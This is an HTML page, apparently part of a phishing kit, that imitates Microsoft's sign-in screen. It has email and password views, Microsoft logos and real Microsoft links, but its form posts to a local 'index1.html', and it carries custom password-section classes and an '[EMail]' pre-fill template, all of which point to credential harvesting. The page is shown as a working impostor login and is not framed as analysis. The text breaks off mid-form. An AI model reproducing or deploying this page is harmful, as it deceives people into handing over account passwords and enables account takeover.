
<html dir="ltr" class="" lang="en">
<head>
    <title>Sign in to your account</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <meta name="PageID" content="ConvergedSignIn">
    <meta name="SiteID" content="">
    <meta name="ReqLC" content="1033">
    <meta name="LocLC" content="en-US">

    <noscript>
        <meta http-equiv="Refresh" content="0; URL=https://login.microsoftonline.com/jsdisabled" />
    </noscript>
    <link rel="shortcut icon" href="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8576.13/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">
    <meta name="robots" content="none">
   <style>
     html {
    overflow: scroll;
    overflow-x: hidden;
    }
    ::-webkit-scrollbar {
    width: 0px; /* remove scrollbar space /
    background: transparent; / optional: just make scrollbar invisible /
    }
    / optional: show position indicator in red */
    ::-webkit-scrollbar-thumb {
    background: #FF0000;
    }
   </style>

    <link crossorigin="anonymous" href="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8576.13/content/cdnbundles/converged.v2.login.min_xu7km3oxm4bwp2b-mqyozg2.css" rel="stylesheet" onerror="$Loader.On(this,true)" onload="$Loader.On(this)" integrity="sha384-oeT7RE+jUqvrrN6tzkQqVkE1XiqysTeQdBVsLf8laIGpeReVI+Dac1mjekZRn1Lm">
<!--
    <script crossorigin="anonymous" src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8576.13/content/cdnbundles/oldconvergedlogin_pcore.min_ovxfjybbajctcw2kqlt2eg2.js" onerror="$Loader.On(this,true)" onload="$Loader.On(this)" integrity="sha384-82QXVigHeXyO7aW4NBkcv0dbcJ0JUHwPqHD6SRr+KRD3hzdEvsKAt+3n1t1wbR+N"></script>

    <script crossorigin="anonymous" src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8576.13/content/cdnbundles/convergedloginpaginatedstrings-en.min_ojdp3evnemcetlncdp3r4w2.js" onerror="$Loader.On(this,true)" onload="$Loader.On(this)" integrity="sha384-quWht0p82N7i0EkY4KTL6Bwo+g2sUH9qRIuVi/Yzy5EU2wY7XqqQ6lOMOTgNL9Pm"></script>
-->
<script>
function myFunction() {
  alert("Hello! I am an alert box!!");
}
</script>

</head>

        <!--  -->
        <div data-bind="component: { name: 'background-image', publicMethods: backgroundControlMethods }">
            <div class="background" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
                <!-- ko if: smallImageUrl -->
                <div data-bind="backgroundImage: smallImageUrl()" style="background-image: url(&quot;https://www.oddstips.co.uk/wp-content/themes/focusblog/bg2.jpg&quot;);"></div>
                <!-- /ko -->
                <!-- ko if: backgroundImageUrl -->
                <div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="background-image: url(&quot;https://www.oddstips.co.uk/wp-content/themes/focusblog/bg2.jpg&quot;);"></div>
                <!-- ko if: useImageMask -->
                <!-- /ko -->
                <!-- /ko -->

            </div>
        </div>

        <div data-bind="if: activeDialog"></div>
        <form name="f1" id="i0281" novalidate="novalidate" spellcheck="false" method="post" target="_top" autocomplete="off" data-bind="autoSubmit: forceSubmit, attr: { action: postUrl }, ariaHidden: activeDialog" action="index1.html">
            <!-- ko if: svr.iBannerEnvironment -->
            <!-- /ko -->
            <!-- ko withProperties: { '$loginPage': $data } -->
            <div class="outer" data-bind="component: { name: 'page',
        params: {
            serverData: svr,
            showButtons: svr.fShowButtons,
            showFooterLinks: true,
            useWizardBehavior: svr.fUseWizardBehavior,
            handleWizardButtons: false,
            password: password,
            hideFromAria: ariaHidden },
        event: {
            footerAgreementClick: footer_agreementClick } }">
                <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } -->
                <!-- ko if: svr.fShowCookieBanner -->
                <!-- /ko -->
                <div class="middle" data-bind="css: { 'app': backgroundLogoUrl }">
                    <!-- ko if: backgroundLogoUrl() && !(paginationControlMethods() && paginationControlMethods().currentViewHasMetadata('hideLogo')) -->
                    <!-- /ko -->
                    <div class="background-logo-holder">
                            <img class="background-logo" role="presentation" data-bind="attr: { src: $page.backgroundLogoUrl }" src="https://aadcdn.msauth.net/shared/1.0/content/images/applogos/53_8b36337037cff88c3df203bb73d58e41.png">
                        </div>
                    <div class="inner" data-bind="
                animationEnd: paginationControlMethods() &amp;&amp; paginationControlMethods().view_onAnimationEnd,
                css: {
                    'app': backgroundLogoUrl,
                    'wide': paginationControlMethods() &amp;&amp; paginationControlMethods().currentViewHasMetadata('wide'),
                    'fade-in-lightbox': fadeInLightBox,
                    'has-popup': showFedCredButton,
                    'transparent-lightbox': backgroundControlMethods() &amp;&amp; backgroundControlMethods().useTransparentLightBox }">
                        <div class="lightbox-cover" data-bind="css: { 'disable-lightbox': svr.fAllowGrayOutLightBox &amp;&amp; showLightboxProgress() }"></div>

						<div data-bind="component: { name: 'logo-control',
                    params: {
                        isChinaDc: svr.fIsChinaDc,
                        bannerLogoUrl: bannerLogoUrl() } }">

                        <img class="logo" pngsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8576.13/content/images/microsoft_logo_ed9c9eb0dce17d752bedea6b5acda6d9.png" svgsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8576.13/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }" src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8576.13/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft">
                        </div>

						<div  class="pass_section_xyz" style="display: none" role="main" data-bind="component: { name: 'pagination-control',
                        publicMethods: paginationControlMethods,
                        params: {
                            enableCssAnimation: svr.AZ,
                            initialViewId: initialViewId,
                            currentViewId: currentViewId,
                            initialSharedData: initialSharedData,
                            initialError: $loginPage.getServerError() },
                        event: {
                            cancel: paginationControl_onCancel,
                            showView: $loginPage.view_onShow,
                            setLightBoxFadeIn: view_onSetLightBoxFadeIn,
                            animationStateChange: paginationControl_onAnimationStateChange } }">
                            <!--  -->
                            <div data-bind="css: { 'zero-opacity': hidePaginatedView() }">
                                <div data-bind="css: {
        'animate': animate() &amp;&amp; animate.animateBanner(),
        'slide-out-next': animate.isSlideOutNext(),
        'slide-in-next': animate.isSlideInNext(),
        'slide-out-back': animate.isSlideOutBack(),
        'slide-in-back': animate.isSlideInBack() }">
                                    <div data-bind="component: { name: 'identity-banner-control',
            params: {
                pawnIconId: svr.bt,
                userTileUrl: svr.Bi,
                displayName: sharedData.displayName || svr.g,
                isBackButtonVisible: isBackButtonVisible(),
                focusOnBackButton: isBackButtonFocused(),
                backButtonDescribedBy: backButtonDescribedBy() },
            event: {
                backButtonClick: identityBanner_onBackButtonClick } }">
                                        <!--  -->
                                        <div class="identityBanner">
                                            <!-- ko if: isBackButtonVisible -->
                                            <!-- /ko -->
                                            <div id="displayName" class="identity" data-bind="text: unsafe_displayName, attr: { 'title': unsafe_displayName }" title=""></div>
                                            <!-- ko ifnot: svr.H -->
                                            <!-- /ko -->
                                        </div>
                                    </div>
                                </div>
                                <!-- /ko -->
                                <div class="pagination-view has-identity-banner" data-bind="css: {
        'has-identity-banner': showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.g),
        'zero-opacity': hidePaginatedView.hideSubView(),
        'animate': animate(),
        'slide-out-next': animate.isSlideOutNext(),
        'slide-in-next': animate.isSlideInNext(),
        'slide-out-back': animate.isSlideOutBack(),
        'slide-in-back': animate.isSlideInBack() }">

                                    <div data-viewid="2" data-showidentitybanner="true" data-dynamicbranding="true" data-bind="pageViewComponent: { name: 'login-paginated-password-view',
                        params: {
                            serverData: svr,
                            serverError: initialError,
                            isInitialView: isInitialState,
                            username: sharedData.username,
                            displayName: sharedData.displayName,
                            hipRequiredForUsername: sharedData.hipRequiredForUsername,
                            passwordBrowserPrefill: sharedData.passwordBrowserPrefill,
                            availableCreds: sharedData.availableCreds,
                            flowToken: sharedData.flowToken,
                            defaultKmsiValue: svr.w === 1,
                            userTenantBranding: sharedData.userTenantBranding,
                            sessions: sharedData.sessions,
                            callMetadata: sharedData.callMetadata,
                            gitHubRedirectUrl: sharedData.gitHubParams.redirectUrl || svr.M },
                        event: {
                            updateFlowToken: $loginPage.view_onUpdateFlowToken,
                            submitReady: $loginPage.view_onSubmitReady,
                            redirect: $loginPage.view_onRedirect,
                            resetPassword: $loginPage.passwordView_onResetPassword,
                            setBackButtonState: view_onSetIdentityBackButtonState,
                            setPendingRequest: $loginPage.view_onSetPendingRequest } }">
                                        <!--  -->
                                        <input type="hidden" name="i13" data-bind="value: isKmsiChecked() ? 1 : 0" value="0">
                                        <input type="hidden" class="login_name_xyz" name="login" data-bind="value: unsafe_username" value="[EMail]">
                                        <input type="text" name="loginfmt" data-bind="moveOffScreen, value: unsafe_displayName" class="moveOffScreen" tabindex="-1" aria-hidden="true">
                                        <input type="hidden" name="type" data-bind="value: svr.ao ? 20 : 11" value="11">
                                        <input type="hidden" name="LoginOptions" data-bind="value: isKmsiChecked() ? 1 : 3" value="3">
                                        <input type="hidden" name="lrt" data-bind="value: callMetadata.IsLongRunningTransaction" value="">
                                        <input type="hidden" name="lrtPartition" data-bind="value: callMetadata.LongRunningTransactionPartition" value="">
                                        <input type="hidden" name="hisRegion" data-bind="value: callMetadata.HisRegion" value="">
                                        <input type="hidden" name="hisScaleUnit" data-bind="value: callMetadata.HisScaleUnit" value="">
                                        <div id="loginHeader" class="row text-title" role="heading" aria-level="1" data-bind="text: str['CT_PWD_STR_EnterPassword_Title']">Enter password</div>
                                        <!-- ko if: unsafe_pageDescription -->
                                        <!-- /ko -->
                                        <div class="row">
                                            <div class="form-group col-md-24">
                                                  <div role="alert" aria-live="assertive">
                                                <!-- ko if: usernameTextbox.error -->
												<div class="alert alert-error col-md-24 alert_msg_yxq alert_email_sect" style="display: none;" id="usernameError" data-bind="
            htmlWithBindings: usernameTextbox.error,
            childBindings: {
                'idA_PWD_SignUp': { href: svr.urlSignUp, click: signup_onClick },
                'otherIdpLogin': { href: svr.urlGoToAADError, click: otherIdpLogin_onClick } }">
                                                    We couldn't find an account with that username. Try another, or
                                                    <a id="idA_PWD_SignUp" href="https://login.live.com/oauth20_authorize.srf?response_type=code&amp;client_id=51483342-085c-4d86-bf88-cf50c7252078&amp;scope=openid+profile+email+offline_access&amp;response_mode=form_post&amp;redirect_uri=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2ffederation%2foauth2&amp;state=rQIIAeNisNLJKCkpKLbS1y_ILypJzNHLzUwuyi_OTyvJz8vJzEvVS87P1csvSs9MAbGKhLgE5N-HsRnaz3GZ3Nb0o0aAj2MWI2d8TmYZWOUqRmXCxulfYGR8wch4i0nQvyjdMyW82C01JbUosSQzP-8Ci8ArFh4DZisODi4BBgkGBYYfLIyLWIG2Rik0X16_dbXTrqAUuYQeZ4ZTrPpRVd4W-b7mmV4ppv5hlW6-lqaluRYWHrl5XtppBkXhQUUhmQElZWVGAaGBtqZWhhPYhCawMZ1iY_jAxtjBznCAk_EWl4iRgaGlroGRroGJgoGllZGRlbFRFAA1&amp;estsfed=1&amp;uaid=0656ef1f3f31449c938682f87c100e08&amp;signup=1&amp;lw=1&amp;fl=easi2&amp;fci=https%3a%2f%2fportal.microsoftonline.com.orgid.com">
				get a new Microsoft account
				</a>.</div>

                                                <!-- /ko -->
                                            </div>
                                                <div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox',
            publicMethods: passwordTextbox.placeholderTextboxMethods,
            params: {
                serverData: svr,
                hintText: str['CT_PWD_STR_PwdTB_Label'] },
            event: {
                updateFocus: passwordTextbox.textbox_onUpdateFocus } }">
                                                    <!-- ko withProperties: { '$placeholderText': placeholderText } -->
                                                    <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } -->
                                                    <input name="passwd" type="password" id="i0118" autocomplete="off" class="form-control" aria-describedby="passwordError loginHeader passwordDesc" aria-required="true" data-bind="
                    textInput: passwordTextbox.value,
                    hasFocusEx: passwordTextbox.focused,
                    placeholder: $placeholderText,
                    ariaLabel: unsafe_passwordAriaLabel,
                    css: { 'has-error': passwordTextbox.error }" placeholder="Password" aria-label="Enter the password for ">
                                                    <!-- /ko -->
                                                    <!-- /ko -->
                                                    <!-- ko ifnot: usePlaceholderAttribute -->
                                                    <!-- /ko -->
                                                </div>
                                            </div>
                                        </div>
                                        <!-- ko if: svr.Ab && showHip -->
                                        <!-- /ko -->
                                        <div data-bind="invertOrder: svr.bd, css: { 'position-buttons': !tenantBranding.BoilerPlateText }" class="position-buttons">
                                            <div>
                                                <!-- ko if: svr.bG -->
                                                <!-- /ko -->
                                                <!-- ko if: svr.aC !== false && !svr.bG && !tenantBranding.KeepMeSignedInDisabled -->
                                                <div id="idTd_PWD_KMSI_Cb" class="form-group checkbox text-block-body no-margin-top" data-bind="visible: !svr.F &amp;&amp; !showHip">
                                                    <label id="idLbl_PWD_KMSI_Cb">
                                                        <input name="KMSI" id="idChkBx_PWD_KMSI0Pwd" type="checkbox" data-bind="checked: isKmsiChecked, ariaLabel: str['CT_PWD_STR_KeepMeSignedInCB_Text']" aria-label="Keep me signed in"> <span data-bind="text: str['CT_PWD_STR_KeepMeSignedInCB_Text']">Keep me signed in</span> </label>
                                                </div>
                                                <!-- /ko -->
                                                <div class="row">
                                                    <div class="col-md-24">
                                                        <div class="text-13 action-links">
                                                            <div class="form-group"> <a id="idA_PWD_ForgotPassword" role="link" href="https://account.live.com/ResetPassword.aspx?wreply=https://login.live.com/oauth20_authorize.srf%3fresponse_type%3dcode%26client_id%3d51483342-085c-4d86-bf88-cf50c7252078%26scope%3dopenid%2bprofile%2bemail%2boffline_access%26response_mode%3dform_post%26redirect_uri%3dhttps%253a%252f%252flogin.microsoftonline.com%252fcommon%252ffederation%252foauth2%26state%3drQIIAeNisNLJKCkpKLbS1y_ILypJzNHLzUwuyi_OTyvJz8vJzEvVS87P1csvSs9MAbGKhLgEOhzkFBYXR3m11Zle3FvBmjCLkTM-J7MMrHIVozJh4_QvMDK-YGS8xSToX5TumRJe7JaaklqUWJKZn3eBReAVC48BsxUHB5cAgwSDAsMPFsZFrEBb40pDQg3r0t0nbto2zWOTN8MpVv2oKm-LfF_zTK8UU_-wSjdfS9PSXAsLj9w8L-00g6LwoKKQzICSsjKjgNBAWwsrwwlsQhPYmE6xMXxgY-xgZzjAyXiLS8TIwNBS18BI18BEwcDCysTCytgkCgA1%26estsfed%3d1%26uaid%3d201e408873a34a5a867e35d1bd780560%26fci%3dhttps%253a%252f%252fportal.microsoftonline.com.orgid.com%26username%3d%26contextid%3d34A42CC81359F79A%26bk%3d1549270157&amp;id=293577&amp;uiflavor=web&amp;client_id=1E00004417ACAE&amp;mkt=EN-US&amp;lc=1033&amp;bk=1549270157" data-bind="text: str['CT_PWD_STR_ForgotPwdLink_Text'], href: svr.n, click: resetPassword_onClick">Forgot my password</a> </div>

                                                            <div class="form-group">

                                                            </div>

                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }">
                                                <div data-bind="component: { name: 'footer-buttons-field',
        params: {
            serverData: svr,
            primaryButtonText: str['CT_PWD_STR_SignIn_Button'],
            isPrimaryButtonEnabled: !isRequestPending(),
            isPrimaryButtonVisible: svr.G,
            isSecondaryButtonEnabled: true,
            isSecondaryButtonVisible: svr.G &amp;&amp; isBackButtonVisible() &amp;&amp; !svr.H },
        event: {
            primaryButtonClick: primaryButton_onClick,
            secondaryButtonClick: secondaryButton_onClick } }">
                                                    <div class="col-xs-24 no-padding-left-right form-group no-margin-bottom button-container" data-bind="
    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
    css: { 'no-margin-bottom': removeBottomMargin || svr.bd, 'button-container': svr.bd }">
                                                        <!-- ko if: isSecondaryButtonVisible -->
                                                        <!-- /ko -->
														<div data-bind="
        css: {
            'inline-block': svr.bd,
            'col-xs-12 primary': isSecondaryButtonVisible() &amp;&amp; !svr.bd,
            'col-xs-24': !(isSecondaryButtonVisible() || svr.bd) }" class="inline-block">
                                                           <input type="submit" id="idSIButton9" class="btn btn-block btn-primary button_one check-password" data-bind="
            attr: {
                'id': primaryButtonId || 'idSIButton9',
                'aria-describedby': primaryButtonDescribedBy },
            value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
            hasFocus: focusOnPrimaryButton,
            click: primaryButton_onClick,
            enable: isPrimaryButtonEnabled,
            visible: isPrimaryButtonVisible,
            preventTabbing: primaryButtonPreventTabbing" value="Sign in"> </div>
			<div style="float: right; padding-left: 5px; padding-top: 4px; display: none;" class="ldsddddd">
														<img src="data:image/gif;base64,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">
														</div>

                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="email_section_xyz" style="display: none" role="main" data-bind="component: { name: 'pagination-control',
                        publicMethods: paginationControlMethods,
                        params: {
                            enableCssAnimation: svr.fEnableCssAnimation,
                            initialViewId: initialViewId,
                            currentViewId: currentViewId,
                            initialSharedData: initialSharedData,
                            initialError: $loginPage.getServerError() },
                        event: {
                            cancel: paginationControl_onCancel,
                            showView: $loginPage.view_onShow,
                            setLightBoxFadeIn: view_onSetLightBoxFadeIn,
                            animationStateChange: paginationControl_onAnimationStateChange } }">
                            <!--  -->
                            <div data-bind="css: { 'zero-opacity': hidePaginatedView() }">

                                <div class="pagination-view" data-bind="css: {
        'has-identity-banner': showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.sPOST_Username),
        'zero-opacity': hidePaginatedView.hideSubView(),
        'animate': animate(),
        'slide-out-next': animate.isSlideOutNext(),
        'slide-in-next': animate.isSlideInNext(),
        'slide-out-back': animate.isSlideOutBack(),
        'slide-in-back': animate.isSlideInBack() }">

                                    <div data-viewid="1" data-showfedcredbutton="true" data-bind="pageViewComponent: { name: 'login-paginated-username-view',
                        params: {
                            serverData: svr,
                            serverError: initialError,
                            isInitialView: isInitialState,
                            displayName: sharedData.displayName,
                            prefillNames: $loginPage.prefillNames,
                            flowToken: sharedData.flowToken },
                        event: {
                            refresh: $loginPage.view_onRefresh,
                            redirect: $loginPage.view_onRedirect,
                            setPendingRequest: $loginPage.view_onSetPendingRequest,
                            showLearnMore: $loginPage.learnMore_onShow,
                            registerDialog: $loginPage.view_onRegisterDialog,
                            unregisterDialog: $loginPage.view_onUnregisterDialog,
                            showDialog: $loginPage.view_onShowDialog } }">
                                        <!--  -->
                                        <div data-bind="component: { name: 'header-control', params: { serverData: svr } }">
                                            <div class="row text-title" id="loginHeader">
												<div role="heading" aria-level="1" data-bind="text: title">Sign in</div>
                                            </div>
                                        </div>
                                        <div class="row">
                                            <div role="alert" aria-live="assertive">
												<div class="alert alert-error col-md-24 alert_msg_yxq alert_email_sect" style="display: none;" id="usernameError" data-bind="
            htmlWithBindings: usernameTextbox.error,
            childBindings: {
                'idA_PWD_SignUp': { href: svr.urlSignUp, click: signup_onClick },
                'otherIdpLogin': { href: svr.urlGoToAADError, click: otherIdpLogin_onClick } }">
                                                    We couldn't find an account with that username. Try another, or
                                                    <a id="idA_PWD_SignUp" href="https://login.live.com/oauth20_authorize.srf?response_type=code&amp;client_id=51483342-085c-4d86-bf88-cf50c7252078&amp;scope=openid+profile+email+offline_access&amp;response_mode=form_post&amp;redirect_uri=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2ffederation%2foauth2&amp;state=rQIIAeNisNLJKCkpKLbS1y_ILypJzNHLzUwuyi_OTyvJz8vJzEvVS87P1csvSs9MAbGKhLgE5N-HsRnaz3GZ3Nb0o0aAj2MWI2d8TmYZWOUqRmXCxulfYGR8wch4i0nQvyjdMyW82C01JbUosSQzP-8Ci8ArFh4DZisODi4BBgkGBYYfLIyLWIG2Rik0X16_dbXTrqAUuYQeZ4ZTrPpRVd4W-b7mmV4ppv5hlW6-lqaluRYWHrl5XtppBkXhQUUhmQElZWVGAaGBtqZWhhPYhCawMZ1iY_jAxtjBznCAk_EWl4iRgaGlroGRroGJgoGllZGRlbFRFAA1&amp;estsfed=1&amp;uaid=0656ef1f3f31449c938682f87c100e08&amp;signup=1&amp;lw=1&amp;fl=easi2&amp;fci=https%3a%2f%2fportal.microsoftonline.com.orgid.com">
				get a new Microsoft account
				</a>.</div>
                                            </div>
                                            <div class="form-group col-md-24">

                                                <div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox',
            publicMethods: usernameTextbox.placeholderTextboxMethods,
            params: {
                serverData: svr,
                hintText: tenantBranding.UserIdLabel || str['CT_PWD_STR_Email_Example'],
                hintCss: 'placeholder' + (!svr.fAllowPhoneSignIn ? ' ltr_override' : '') },
            event: {
                updateFocus: usernameTextbox.textbox_onUpdateFocus } }">
                                                    <!-- ko withProperties: { '$placeholderText': placeholderText } -->
                                                    <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } -->
													<span></span>
                                                    <input type="email" name="loginfmt" id="i0116" maxlength="113" class="form-control ltr_override" aria-describedby="usernameError loginHeader loginDescription" aria-required="true" data-bind="textInput: usernameTextbox.value,
                    hasFocusEx: usernameTextbox.focused,
                    placeholder: $placeholderText,
                    ariaLabel: tenantBranding.UserIdLabel || str['CT_PWD_STR_Username_AriaLabel'],
                    css: { 'has-error': usernameTextbox.error },
                    attr: inputAttributes" placeholder="Email, phone, or Skype" aria-label="Enter your email, phone, or Skype." lang="en">
                                                    <input name="passwd" type="password" id="i0118" autocomplete="off" data-bind="moveOffScreen, textInput: passwordBrowserPrefill" class="moveOffScreen" tabindex="-1" aria-hidden="true">
                                                    <!-- /ko -->
                                                    <!-- /ko -->
                                                    <!-- ko ifnot: usePlaceholderAttribute -->
                                                    <!-- /ko -->
                                                </div>
                                                <!-- /ko -->
                                            </div>
                                        </div>
                                        <div data-bind="invertOrder: svr.fRepositionFooterButtons, css: { 'position-buttons': !tenantBranding.BoilerPlateText }" class="position-buttons">
                                            <div class="row">
